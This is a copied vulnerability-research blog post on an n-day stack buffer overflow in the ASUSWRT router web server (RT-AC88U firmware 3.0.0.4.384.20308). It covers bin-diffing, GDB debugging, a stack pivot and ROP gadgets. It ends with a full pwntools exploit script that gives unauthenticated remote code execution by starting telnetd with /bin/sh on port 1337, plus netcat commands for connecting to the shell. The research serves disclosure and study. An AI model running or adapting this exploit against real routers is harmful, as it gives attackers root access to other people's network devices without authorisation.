---
ID: 20200807000000
tags:
  - Blogging
  - vuln_research/n-day
Created: 2023-09-05 17:22:00
Last Modified: 2023-09-05 17:22:00
date: 2020/08/07
---
![[Pasted image 20241113021909.png]]
# Description
Similar to post on [[20201016000000 - BLG - Analysis & Exploitation of a Recent TP-Link Archer A7 Vulnerability|Analysis & Exploitation of a Recent TP-Link Archer A7 Vulnerability]], post is originally written for a [blogpost](https://starlabs.sg/blog/2020/08-asuswrt-url-processing-stack-buffer-overflow/)which is cloned here.

While processing the URL for any blacklisted XSS list like the script tag in the `check_xss_blacklist` function, a stack buffer overflow is possible by extending the length of the URL when accessing the web interface of the ASUS Router. To exploit it, stack pivoting technique is used before chaining up ROP gadgets to call our own custom command. In this post, we show how this can be exploited to get a reverse shell.

This vulnerability exists in routers that are using ASUSWRT 3.0.0.4.384.20308 (2018/02/01), and for our purposes, we used the RT-AC88U.

# Introduction

A router is a networking device that is involved in the forwarding of network traffic which now exist in most homes, companies, cafes, train stations and more. Depending on the different models, it usually comes with a web interface to control different settings and configurations for the router.

For this particular ASUS firmware, there is a stack buffer overflow vulnerability if too many bytes are being added to the path during URL processing when attempting to sign in to the web interface. This ultimately allows an attacker to get full control of the router without the need for any proper authentication. The only requirement is for the attacker to be in the same network.

# Static Analysis

## Bin-Diffing

Bin-diffing is a technique that can be useful for N-day research like this. It allows a researcher to look for potential bugs by finding out the reason for each patch between an older and the newer binary. In this post, we use [Diaphora](https://github.com/joxeankoret/diaphora), an open-source bin-diffing tool for IDA Pro, to see the changes from the patched version `3.0.0.4.384.20308` against the vulnerable version `3.0.0.4.384.20379`.

First, we need to download the firmware with the `.trx` extension from the ASUS site. It is no longer available, but fortunately has been [mirrored on SoftPedia](https://drivers.softpedia.com/get/Router-Switch-Access-Point/ASUS/ASUS-RT-AC68U-Router-Firmware-3-0-0-4-384-20308.shtml).

Our focus will be on the `httpd` binary that processes the web requests. We can extract the contents of the firmware using `binwalk`:

```
binwalk -eM <firmware>.trx
cd ./<firmware>.trx.extracted/squashfs-root/usr/sbin
ls | grep "httpd"
```

Under the partial match, there are two functions, one of which has the name `sub_443CC` in the target unpatched binary. The updated function checks for the length of a string, making sure that it is less than size of 0x100. This sounds like a possible out-of-bound write.

![[Pasted image 20241113014923.png]]

The variable that is subject to extra length checks refers to the `path` in the `url`. The trace is as follows:

```
handle_request --> auth_check --> page_default_redirect --> check_xss_blacklist 
```

In handle request

```c
((void (*)(void))handler->auth)();
result = auth_check((int)&auth_realm, authorization, url, (int)file, cookies, fromapp);
```

In `auth_check`

```c
    page_default_redirect_sub_D6C0(a6, v6);
    return v7;
  }
  v18 = strspn(v17 + 11, " \t");
  snprintf((char *)&v22, 0x20u, "%s", &v7[v18 + 11]);
  if ( !sub_4639C(&v22, 0) )
  {
    v19 = sub_44C88(&v22);
    v16 = v19;
    if ( !v19 )
    {
      if ( !sub_DF98(0) )
      {
        if ( !strcmp((const char *)&unk_A619C, (const char *)&v22) )
        {
          dword_6742C = 0;
        }
        else
        {
          strlcpy(&unk_A619C, &v22, 32);
          dword_6742C = 1;
        }
        return (const char *)2;
      }
      page_default_redirect_sub_D6C0(a6, v6);
      return (const char *)v16;
    }
  }
```

in `page_default_redirect_sub_D6C0`

```c
nt __fastcall page_default_redirect_sub_D6C0(int fromapp_flag, const char *url)
{
  const char *url_1; // r5
  int fromapp_flag_1; // r4
  char *login_url; // r0
  const char *INDEXPAGE; // r1
  bool v6; // zf
  char inviteCode; // [sp+8h] [bp-110h]

  url_1 = url;
  fromapp_flag_1 = fromapp_flag;
  memset(&inviteCode, 0, 0x100u);
  login_url = (char *)check_xss_blacklist(url_1, 1);
  v6 = login_url == 0;
  if ( login_url )
    login_url = (char *)&unk_A6758;
  else
    INDEXPAGE = url_1;
  if ( v6 )
    login_url = (char *)&unk_A6758;
  else
    INDEXPAGE = "index.asp";
  strncpy(login_url, INDEXPAGE, 0x80u);
  if ( !fromapp_flag_1 )
    snprintf(&inviteCode, 0x100u, "<script>top.location.href='/page_default.cgi?url=%s';</script>", url_1);
  return sub_D3C4(200, "OK", 0, &inviteCode, fromapp_flag_1);
}
```

After renaming most of the variables according to [https://github.com/smx-smx/asuswrt-rt/blob/master/apps/public/boa-asp/src/util.c#L1109](https://github.com/smx-smx/asuswrt-rt/blob/master/apps/public/boa-asp/src/util.c#L1109)

```c
signed int __fastcall check_xss_blacklist(const char *path, int check_www)
{
  const char *vPath; // r5
  int check_www_; // r6
  int i; // r8
  char *path_t; // r4
  bool v6; // zf
  int path_1; // r7
  char *query; // r7
  const char *path_t_; // r1
  size_t file_len; // r2
  size_t length_of_path_t; // r6
  int path_string; // [sp+0h] [bp-218h] with size 0x100
  char url_string; // [sp+100h] [bp-118h]
  char filename; // [sp+180h] [bp-98h]

  vPath = path;
  check_www_ = check_www;
  memset(&filename, 0, 0x80u);
  memset(&path_string, 0, 0x100u); // Set all 100 bytes to 0
  if ( !vPath || !*vPath )  // After the patch, `strlen(vPath) > 0x100 ` is added to this condition
    return 1;
  i = 0;
  path_t = strdup(vPath);
  while ( 1 )
  {
    path_1 = (unsigned __int8)vPath[i];
    if ( !vPath[i] ) // Forever checking if there is a character even if it has length of say 0x300
      break;
    v6 = path_1 == '<';
    if ( path_1 != '<' )
      v6 = path_1 == '>';
    if ( v6 || path_1 == '%' || path_1 == '(' || path_1 == ')' || path_1 == '&' )
      goto LABEL_24;
    *((_BYTE *)&path_string + i++) = *((_WORD *)*_ctype_tolower_loc() + path_1);        // This is where the overwrite occurs
  }
  if ( strstr((const char *)&path_string, "script") || strstr((const char *)&path_string, "//") )
  {
LABEL_24:
    free(path_t);
    return 1;
  }
  ...
```

This tracing shows that while checking for XSS using a blacklist, there is a vulnerability that allows an attacker to create a long string in the `url` path in a request when accessing `router.asus.com`.

Here, the `path` variable is controllable via the `url` path and this function does not check if `vPath`’s length is more than the allocated buffer. The string pointed to by the `vPath` variable is copied to the `path_string` buffer via `memset` function. The catch is that `path_string` buffer is of a fixed size while `vPath` can exceed because there is no check for size. This explains the `strlen` addition to the binary as patch.

What happens is that, there will be checks for some characters to be deemed as bad. Next, while there are still characters in `vPath` even if it exceeds the buffer size of `0x100`, it will still continue to write into `path_string` and increments `i`. So if we write more than `0x218` bytes, we can start to alter the stack outside of its stack frame.

## Dynamic Analysis

`pwntools` is a popular Python library that can be used to build exploits. The following script can be used to trigger the crash:

```python
from pwn import *
context.terminal = ["terminator","-e"]
context(arch='arm', bits=32, endian='little', os='linux')

HOST = "192.168.2.1"  # CHANGE THIS TO ADDRESS OF router.asus.com
PORT = 80 # This is the http port where the web interface is at

# Follow the response header copied from the browser
header = "GET /" + "A"*(532) +" HTTP/1.1\r\n"
header += "Host : router.asus.com\r\n"
header += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
header += "Accept-Language: en-US,en;q=0.5\r\n"
header += "Accept-Encoding: gzip, deflate\r\n"
header += "Cookie: clickedItem_tab=0\r\n"
header += "Connection: keep-alive\r\n"
header += "Upgrade-Insecure-Requests: 1\r\n"
header += "Cache-Control: max-age=0\r\n"

# Connect to the router
p = remote(HOST,PORT)
print p.recvrepeat(1)

p.send(header)
print p.recvrepeat(2)
```

### Debugging In GDB

Make sure that SSH has been enabled in the router so that the process of transferring ARM statically-linked GDB to the router can be made easier. The statically linked GDB was obtained from [here](https://github.com/therealsaumil/static-arm-bins/blob/master/gdb-arm-static-7.11). Make sure that you get the correct architecture for the router, which is 32bit.

Attach GDB to the `httpd` PID and finally run the curl command again. This time, the SIGSEGV should occur:

![[Pasted image 20241113015010.png]]

### Fixing SIGILL

When attempting to re-run the binary, `SIGILL` exception would be returned.

![[Pasted image 20241113015035.png]]

According to this [StackOverflow post](https://stackoverflow.com/questions/16393414/how-to-get-rid-of-openssl-error), `OPENSSL_cpuid_setup()` assumes that it can trap SIGILL and continue if instruction is unable to be performed. Therefore by setting environment variable `OPENSSL_armcap = 0` should mitigate the problem.

```
(gdb) set env OPENSSL_armcap=0
(gdb) run
```

### Controlling The Program Counter (PC)

Approach:

- Breakpoint at the start of the while loop
- Set a conditional breakpoint on the 0x100th iteration of `*((_BYTE *)&path_string + i++) = *((_WORD *)*_ctype_tolower_loc() + path_1);`
- Observe the stack
- Set another conditional breakpoint after right before overwrite the program counter (pc)
- Edit the payload to have 0x100 As, 0x114 Bs and 4 Cs in the url as shown in the following
- Send this header to our router

```shell
curl 'http://router.asus.com/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'\
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'\
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'\
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'\
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCC' \
-H 'Host: router.asus.com' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' --compressed \
-H 'Cookie: clickedItem_tab=0' \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Cache-Control: max-age=0'
```

This should give us a sigsegv fault which is the ones at the `CCCC`.

```
Program received signal SIGSEGV, Segmentation fault.
=> 0x63636362:	Error while running hook_stop:
Cannot access memory at address 0x63636362
0x63636362 in ?? ()
```

As Position-Independent Executables (PIE) security feature is not present, it is easy to breakpoint at fixed location.

First, set a breakpoint at location `0x44454`. These three lines are the ones that is doing the copying of data from `vPath` to `path_string` buffer

```asm
=> 0x44454:	ldr	r3, [r0]
   0x44458:	lsl	r7, r7, #1
   0x4445c:	ldrsh	r2, [r3, r7] <-- Should see a lower case 'a' because of *((_WORD *)*_ctype_tolower_loc() + path_1)
   0x44460:	strb	r2, [sp, r8] <--- The path_string buffer is here 
   0x44464:	add	r8, r8, #1  <-- Where the i increment occurs
```

Step over till `0x44460` and check that `i r $r2` gives 0x61 since this points to our first ‘a’ character in the path.

```
(gdb) i r r2
r2             0x61	97
```

Next, set a conditional breakpoint to stop before writing letter ‘c’ into the buffer. The condition set to break after the 532th iteration. This is how many bytes to write before starting to write the ‘c’s which is in this case the return address.

```
(gdb) break *0x44454 if $r8 == 532
Breakpoint 4 at 0x44454
(gdb) continue
```

Checking the stack after running,

```
=> 0x44454:	ldr	r3, [r0]
   0x44458:	lsl	r7, r7, #1
   0x4445c:	ldrsh	r2, [r3, r7]
   0x44460:	strb	r2, [sp, r8]
   0x44464:	add	r8, r8, #1
   0x44468:	ldrb	r7, [r5, r8]
   0x4446c:	cmp	r7, #0
   0x44470:	bne	0x44424
   0x44474:	mov	r0, sp
   0x44478:	ldr	r1, [pc, #268]	; 0x4458c

Breakpoint 4, 0x00044454 in ?? ()
(gdb) i r $r8
r8             0x214	532
(gdb) x/3s $sp
0x7e992e28:	'a' <repeats 200 times>...
0x7e992ef0:	'a' <repeats 56 times>, 'b' <repeats 144 times>...
0x7e992fb8:	'b' <repeats 132 times>, "0\367"
```

By this state, it shows that it indeed is possible to overwrite the buffer.

Next, set a conditional breakpoint to break at `0x44464` after the 535th iteration. The reason is to make sure that the breakpoint gets hit right before writing the final byte of the return address. In this case, the final letter ‘c’ in the return address.

```
(gdb)break *0x44464 if $r8 == 535 
# This breaks after the final write of the letter 'c'
...
(gdb) i r $r8
r8             0x217	535
(gdb) x/5s $sp
0x7e98ee28:	'a' <repeats 200 times>...
0x7e98eef0:	'a' <repeats 56 times>, 'b' <repeats 144 times>...
0x7e98efb8:	'b' <repeats 132 times>, "cccc"  <<-------OUR RETURN ADDRESS THAT WAS CONTROLLED 
0x7e98f041:	""
0x7e98f042:	""
Breakpoint 7, 0x00044464 in ?? ()
(gdb) ni
...
...
(gdb) ni
Continuing.
=> 0x44584:	add	sp, sp, #512	; 0x200
   0x44588:	pop	{r4, r5, r6, r7, r8, pc} <<-- The 6th position of the stack which is 0x63636363
   0x4458c:	andeq	r2, r5, sp, ror #27
   0x44590:	andeq	r8, r4, r12, asr #19
   0x44594:			; <UNDEFINED> instruction: 0x0004dbba
   0x44598:	andeq	r2, r5, r9, ror r11
   0x4459c:	andeq	r8, r4, r11, lsl #20
   0x445a0:	andeq	r5, r5, lr, asr r5
   0x445a4:	push	{r4, r5, r6, r7, lr}
   0x445a8:	sub	sp, sp, #132	; 0x84

Breakpoint 8, 0x00044584 in ?? ()
(gdb) x/20wx $sp+512
0x7ef86028:	0x62626262	0x62626262	0x62626262	0x62626262
0x7ef86038:	0x62626262	0x63636363	0x00000000	0x00000000
```

# Exploitation

In this section, the properties of the `httpd` binary is stated. It will also explain why a stack pivot gadget was needed and helpful in this phase. Next, it will also explain how the gadgets were chained as well as the location to store the attacker’s custom command which in this case, a reverse shell.

Properties of the `httpd` binary:

- ASLR is enabled
- PIE is not enabled
- NX is enabled
- It is actually fine to put multiple same fields.
    - Example: `Content-Type` field is also accepted
- It is possible to add multiple NULL bytes without error because fgets was used.
- Presence of NULL bytes in the instruction addresses
    - Gives us problems but they can be present at the back of values of fields
- Interesting thing is that there is another part in the stack that is controllable as data are being copied there for processing.

## The Plan

In a nutshell, the plan is to stack pivot to a the region of the stack that stores the headers that was sent to httpd. This is also where command addresses, ROP gadgets and commands would be stored. Next, a ROP chain to store the address of the command into r0 register before calling system function.

## ROP Gadgets

In this exploit, three gadgets were used. One is a stack pivot gadget to pivot the stack that user can control. Stack pivot will be explained in more details in the next section. The `pop_r7_gadget` is used to pop the command address into `r7` register since the `system_gadget` would move that string address from `r7` register into `r0` (first argument) before calling the system function found in httpd binary.

The following snippet are the gadgets used in the exploit.

```python
# The bad bytes are from the xss blacklist that need to be avoided 
# ropper --file httpd_target  --search "add sp" --badbytes 282629253e3c
stack_pivot_gadget = 0x0002acd8  # 0x0002acd8: add sp, sp, #0x400; pop {r4, r5, r6, r7, pc};  

# ropper --file httpd_here --search "pop"
pop_r7_gadget = 0x00010630   #0x00010630: pop {r1, r2, r3, r4, r5, r6, r7, pc};

# Searched from IDA
system_gadget = 0x00025BF4
"""
.text:00025BF4                 MOV             R0, R7  ; command
.text:00025BF8                 BL              system
"""
```

## Stack Pivoting To User-Controlled Region

Before stating what gadgets are needed and used, let’s refresh what stack pivot is.

### What Is A Stack Pivot?

Stack Pivot is a technique that allows attacker to choose the location of the stack to chain gadgets. In this case, the field values also exist in another part of the stack. In this post, this is the stack pivot gadget that was used.

```
0x0002acd8: add sp, sp, #0x400; pop {r4, r5, r6, r7, pc}; 
```

Here, it added 0x400 to the stack which points the stack pointer to 0x400 bytes away from the current `sp` before popping off 4 values off the stack before jumping to the next address. Therefore, it is essential that the stack pointer points to a user-controlled region. To do so, adding values to the header values in the response.

### Why Stack Pivot?

During the parsing of the fields in the headers, string operations are being done which used NULL byte as terminating byte. This means that it is not convenient to put multiple ROP gadgets in the same line as the header will be truncated. However, it is possible to leave the last byte of the value as NULL which suggest just one ROP gadget per line. With just one gadget, it is not possible to chain the ROP chain to move the attacker’s command address into a register before calling the system function.

### How Many Bytes To Pivot To And Why 0x400?

Viewing the stack on GDB in relation to a possible stack to pivot to can help with deciding on the range to pivot to. To do that, set a breakpoint at `0x44584`, run and look at the stack

```
(gdb) x/19s $sp
0x7ee91e38:     "command=/usr/sbin/telnetd\t-l\t/bin/sh\t-p\t1337;", '#' <repeats 90 times>, 'a' <repeats 65 times>...
0x7ee91f00:     'a' <repeats 200 times>...
0x7ee91fc8:     'a' <repeats 140 times>, "ddddeeeeffffgggghhhh\001" <----JUMPS FROM HERE
0x7ee9206a:     ""
0x7ee9206b:     ""
0x7ee9206c:     ""
0x7ee9206d:     ""
0x7ee9206e:     ""
0x7ee9206f:     ""
0x7ee92070:     "GET"
0x7ee92074:     "/command=/usr/sbin/telnetd\t-l\t/bin/sh\t-p\t1337;", '#' <repeats 90 times>, 'A' <repeats 64 times>...
0x7ee9213c:     'A' <repeats 200 times>...
0x7ee92204:     'A' <repeats 141 times>, "DDDDEEEEFFFFGGGGHHHH"
0x7ee922a6:     "HTTP/1.1\r\n"
0x7ee922b1:     "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n" <------TO SOMEWHERE AROUND HERE
0x7ee92304:     "Cookie: clickedItem_tab=0\r\n"
0x7ee92320:     "Cache-Control: max-age=0\r\n"
0x7ee9233b:     "1\r\n"
0x7ee9233f:     ".9,*/*;q=0.8\r\n"
```

The lower addresses of the stack contains the current processed string and the higher addresses contains the input the exploit script supplied. With this in mind, the range that should be used is at least above `612` or `0x264` bytes and the closest that was found was 0x400.

Since 0x400 bytes pivot overshoots the current entire header in the stack, more data are added within the header to make that region of the stack reachable and controllable.

## The ROP Chain

In the first part of the ROP chain, the command address is the address of the URL which is a global variable. It this has a fixed address that can be hardcoded since PIE is not enabled.

```c
// sub_E20C

  memset(byte_A6250, 0, 0x80u);
  v40 = index(v36, 63);
  if ( v40 )
  {
    v41 = strlen(v36);
    v42 = v41 - strlen(v40);
    v43 = v36;
    if ( v42 >= 0x80 )
      v42 = 128;
  }
  else
  {
    v43 = v36;
    v42 = 127;
  }
  strncpy(byte_A6250, v43, v42);
  if ( (strstr(byte_A6250, ".asp") || strstr(byte_A6250, ".htm"))
    && !strstr(byte_A6250, "update_networkmapd.asp")
    && !strstr(byte_A6250, "update_clients.asp")
    && !strstr(byte_A6250, "update_customList.asp") )
  {
    memset(&unk_A61C0, 0, 0x80u);
    snprintf((char *)&unk_A61C0, 0x80u, "%s", byte_A6250);
  }
  if ( strncmp(byte_A6250, "applyapp.cgi", 0xCu)
    && strncmp(byte_A6250, "api.asp", 7u)
    && !strncmp(byte_A6250, "getapp", 6u) )
  {
```

An offset is needed because the url started with `"command="`. The reason for the url to start with that is because the parser would return an error if the url started with a `"/"`.

```c
if ( path[0] != '/' ) {
	send_error( 400, "Bad Request", (char*) 0, "Bad filename." );
	return;
}
file = &(path[1]);
len = strlen( file );
if ( file[0] == '/' || strcmp( file, ".." ) == 0 || strncmp( file, "../", 3 ) == 0 || strstr( file, "/../" ) != (char*) 0 || strcmp( &(file[len-3]), "/.." ) == 0 ) {
	send_error( 400, "Bad Request", (char*) 0, "Illegal filename." );
	return;
}
```

To solve that, the string `command=` can be prepended.

As the stack pivot does not hit within the sent payload, more data was added under the Accept value. The De Bruijn sequence was used to find the offset of the next return address. Note that the return address should be at the end of the value before `"\r\n"`.

The first part of the ROP Chain look like this.

```python
command = '/usr/sbin/telnetd -l /bin/sh -p 1337;'.replace('\x20', '\t').ljust(127,"#")
# The address 0x000a6259 is fixed due to it being in the .bss section as url variable is a global variable and since PIE is not enabled, it is a fixed address
COMMANDADDR = 0x000a6250 + len("command=") # Need to offset else command will point to command= instead

# p32(INITIAL_PIVOT_GADGET)[:-1] is because when this path is taken, the null byte will be added automatically and this 
# is also to allow the continuation of the header processing else there will be an error                                          
header = "GET /command=" + command +  "A"*(532-len(command)-len("command=")) +p32(0x0002acd8)[:-1] +"   HTTP/1.1\r\n"                                                                                           
header += "Host: router.asus.com\r\n"
header += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"        
header += "Accept: text/html,application/xhtml+xml,"+"A"*302+"application/xml;q=0.9,*/*;q=0.8"+p32(0x41414141)+  "\r\n"                                                                                                  
```

This should get a segfault at `0x41414140`.

The next thing to do is to load the pointer to the command via the `pop_r7_gadget`. Add more data when needed to allow the `COMMANDADDR` to be in the right location in the payload and stack and likewise for the `system_gadget` to complete the setup of telnetd on the router.

```python
command = '/usr/sbin/telnetd -l /bin/sh -p 1337;'.replace('\x20', '\t').ljust(127,"#")                                                                                                                             
COMMANDADDR = 0x000a6250 + len("command=")                                                                                                                                                                                                                                                                                                                                                                               
stack_pivot_gadget = 0x0002acd8  # 0x0002acd8: add sp, sp, #0x400; pop {r4, r5, r6, r7, pc};                                                                                                                       
pop_r7_gadget = 0x00010630   #0x00010630: pop {r1, r2, r3, r4, r5, r6, r7, pc};                                                                                                                                    
system_gadget = 0x00025BF4                                                                                                                                                                                         
                                                                                                                                                             
header = "GET /command=" + command +  "A"*(532-len(command)-len("command=")) +p32(stack_pivot_gadget)[:-1] +" HTTP/1.1\r\n"
header += "Host : router.asus.com\r\n"
header += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
header += "Accept: text/html,application/xhtml+xml,"+"A"*302+"application/xml;q=0.9,*/*;q=0.8"+p32(system_gadget)+"\r\n"
header += "Accept-Language: en-US,en;q=0.5\r\n"
header += "Accept-Encoding: gzip, deflate"+"C"*339+p32(COMMANDADDR)+"\r\n"
header += "Cookie: "+p32(system_gadget)+"clickedItem_tab=0\r\n"
header += "Connection: keep-alive\r\n"
header += "Upgrade-Insecure-Requests: 1\r\n"
header += "Cache-Control: max-age=0\r\n"
```

Below shows the successful execution of the payload.

![[Pasted image 20241113015134.png]]

## Getting The Reverse Shell

You can use `pwntools` to connect in the script:

```python
# Connect to telnet
getShell = remote("router.asus.com",1337) 
print getShell.recvuntil("#") 
print getShell.recvrepeat(0.4) 
getShell.sendline("uname -a")
print getShell.recvrepeat(0.5)
getShell.interactive()
```

or you can easily just connect to the router via netcat:

```
nc router.asus.com 1337
```

# Full Exploit Script

```python
"""
#  Author : Lucas Tay
#  Date : 13th APRIL 2020
# 
#  **Affected Models/Versions** 
#     ASUSWRT 3.0.0.4.384.20308 (2018/02/01)
#
#  **Vulnerability Analysis**
#     Firmware Analysed: 
#         - ***ASUSWRT 3.0.0.4.382.20308*** for ***RT_AC88U*** router
#
# Some Details:
#   Change the host address corresponding to router.asus.com
#   Can connect to router via netcat
#   Feel free to change the command but make sure that they are not in the blacklist
#       xssBlackList = ["<",">","%","(",")","&","script"]

"""
from pwn import *

context(arch='arm', bits=32, endian='little', os='linux')
HOST = "192.168.2.1"  # CHANGE THIS TO ADDRESS OF router.asus.com
PORT = 80 # This is the http port where the web interface is at

# The reverse shell inspired by Ngo Wei Lin
command = '/usr/sbin/telnetd -l /bin/sh -p 1337;'.replace('\x20', '\t').ljust(127,"#")
COMMANDADDR = 0x000a6250 + len("command=")

# ropper --file httpd_here --search "add sp"
stack_pivot_gadget = 0x0002acd8  # 0x0002acd8: add sp, sp, #0x400; pop {r4, r5, r6, r7, pc};  

# ropper --file httpd_here --search "pop"
pop_r7_gadget = 0x00010630   #0x00010630: pop {r1, r2, r3, r4, r5, r6, r7, pc};

# Searched from IDA
system_gadget = 0x00025BF4
"""
.text:00025BF4                 MOV             R0, R7  ; command
.text:00025BF8                 BL              system
"""

# Follow the response header copied from the browser
header = "GET /command=" + command +  "A"*(532-len(command)-len("command=")) +p32(stack_pivot_gadget)[:-1] +" HTTP/1.1\r\n"
header += "Host : router.asus.com\r\n"
header += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
header += "Accept: text/html,application/xhtml+xml,"+"A"*302+"application/xml;q=0.9,*/*;q=0.8"+p32(system_gadget)+"\r\n"
header += "Accept-Language: en-US,en;q=0.5\r\n"
header += "Accept-Encoding: gzip, deflate"+"C"*339+p32(COMMANDADDR)+"\r\n"
header += "Cookie: "+p32(system_gadget)+"clickedItem_tab=0\r\n"
header += "Connection: keep-alive\r\n"
header += "Upgrade-Insecure-Requests: 1\r\n"
header += "Cache-Control: max-age=0\r\n"
# Connect to the router
p = remote(HOST,PORT)
print p.recvrepeat(1)

p.send(header)
print p.recvrepeat(2)
p.close()

print("Please wait for about 8 seconds MAX")

import time

time.sleep(8)
# Connect to telnet
getShell = remote("router.asus.com",1337)
print getShell.recvuntil("#")
print getShell.recvrepeat(0.4)
getShell.sendline("uname -a")
print getShell.recvrepeat(0.5)
getShell.interactive()
```

# Conclusion

The firmware version (3.0.0.384.20308) is vulnerable to a stack buffer overflow because the `httpd` binary does not check for length of the URL before processing while checking characters against the XSS Blacklist. The patched version however added one line to check that if the URL path now exceeds over 0x100 and when that happens, it terminates the path processing.

# Credits

The exploit written was highly inspired by the [PagedOut Magazine](https://pagedout.institute/download/PagedOut_001_beta1.pdf) on page 57 `"The Router Security Is Decadent and Depraved"`. The exploit written in this post was also inspired by [Ngo Wei Lin (@Creastery)](https://twitter.com/Creastery)’s exploit template for a similar root cause which was also based on the magazine’s.

We are also thankful to [Hacker_Chai](https://twitter.com/Hacker_Chai) for the link to the StackOverflow post which help solve the issue of SIGILL when trying to re-run the binary in GDB. That had helped alot when debugging in GDB without the need to always restart GDB and wait for the httpd binary to re-run in the router.